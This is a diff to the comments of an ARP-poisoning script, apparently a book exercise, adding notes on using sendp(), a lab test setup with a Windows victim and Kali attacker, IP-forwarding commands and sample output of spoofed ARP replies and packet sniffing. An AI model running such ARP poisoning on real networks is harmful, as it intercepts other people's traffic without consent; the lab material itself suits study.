@@ -120,10 +120,43 @@ if __name__ == '__main__':
     arpoon = Arper(victim, gateway, interface)
     arpoon.run()
     
-# 𝗧𝗲𝘀𝘁:
+# 𝗡𝗼𝘁𝗲𝘀: Replaced send() (used in the book) with sendp
+# - send() does not craft a full ethernate frame
+# - Meaning, you get error: WARNING: You should be providing the Ethernet destination MAC address when sending an is-at ARP.
+# - To solve, we replace with sendp() [check book for original with send()]
+    
+# 𝗧𝗲𝘀𝘁: 
+# Victim OS: Windows 10
+# Attacker OS: Kali Linux
+#
 #                      victim    gateway  interface
 # sudo python arper.py 10.0.2.15 10.0.2.1 eth0
+#
+# ----------------------- Optional if comuncation not happening --------------------------
+# 𝘦𝘤𝘩𝘰 1 > /𝘱𝘳𝘰𝘤/𝘴𝘺𝘴/𝘯𝘦𝘵/𝘪𝘱𝘷4/𝘪𝘱_𝘧𝘰𝘳𝘸𝘢𝘳𝘥 <run before arper.py>
+# 𝘴𝘶𝘥𝘰 𝘴𝘺𝘴 -𝘸 𝘯𝘦𝘵.𝘪𝘯𝘦𝘵.𝘪𝘱.𝘧𝘰𝘳𝘸𝘢𝘳𝘥𝘪𝘯𝘨=1 <lets the host know that we can forward packages>
 
-# --------------------------- Optional if coms not happening -----------------------------
-# 𝘦𝘤𝘩𝘰 1 > /𝘱𝘳𝘰𝘤/𝘴𝘺𝘴/𝘯𝘦𝘵/𝘪𝘱𝘷4/𝘪𝘱_𝘧𝘰𝘳𝘸𝘢𝘳𝘥 <letting the host know that we can forward packages>
-# 𝘴𝘶𝘥𝘰 𝘴𝘺𝘴 -𝘸 𝘯𝘦𝘵.𝘪𝘯𝘦𝘵.𝘪𝘱.𝘧𝘰𝘳𝘸𝘢𝘳𝘥𝘪𝘯𝘨=1
+# 𝗢𝘂𝘁𝗽𝘂𝘁:
+# sudo python arper.py 10.0.2.15 10.0.2.1 eth0
+# Initialized eth0:
+# Gateway (10.0.2.1) is at 52:54:00:12:35:00
+# Victim (10.0.2.15) is at 08:00:27:6e:ad:bb
+# ------------------------------
+# ip src: 10.0.2.1
+# ip dst: 10.0.2.15
+# mac src: 08:00:27:87:ae:89
+# mac dst: 08:00:27:6e:ad:bb
+# ARP is at 08:00:27:87:ae:89 says 10.0.2.1
+# ------------------------------
+# ip src: 10.0.2.15
+# ip dst: 10.0.2.1
+# mac src: 08:00:27:87:ae:89
+# mac dst: 52:54:00:12:35:00
+# ARP is at 08:00:27:87:ae:89 says 10.0.2.15
+# ------------------------------
+# Beginning the ARP poison. [CTRL-C to stop]
+# ...Sniffing 100 packets
+# ..........Got em' packets! Ɛ( · — ·)3
+# Restoring ARP tables...
+# Finished
+# <check arper.pcap and ensure it is populated> 
